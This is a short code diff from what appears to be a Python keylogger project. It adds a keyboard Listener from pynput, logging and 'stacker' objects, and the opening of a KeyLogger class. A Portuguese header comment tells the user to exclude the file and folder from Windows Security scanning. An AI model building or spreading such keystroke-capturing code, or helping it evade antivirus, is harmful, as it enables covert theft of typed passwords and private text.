@@ -1,16 +1,19 @@
 #################################################################################################
 # LEMBRE-SE DE ADICIONAR ESSE ARQUIVO E A PASTA DESSE PROJETO EM EXCLUSÃO NO WINDOWS SECURITY
 #################################################################################################
-# import pynput
+
 # if o pc for windows:
 # from pynput.keyboard._win32 import KeyCode
 
 from pynput.keyboard import Listener
 from Functions.JSONLib import JSONLib
 from Loggers.Logger import Logger
+from Loggers.Stacker import Stacker
 
 json = JSONLib()
-logger = Logger("Keyboard")
+keyboard = "Keyboard"
+logger = Logger(keyboard)
+stacker = Stacker(keyboard)
 
 class KeyLogger():
 
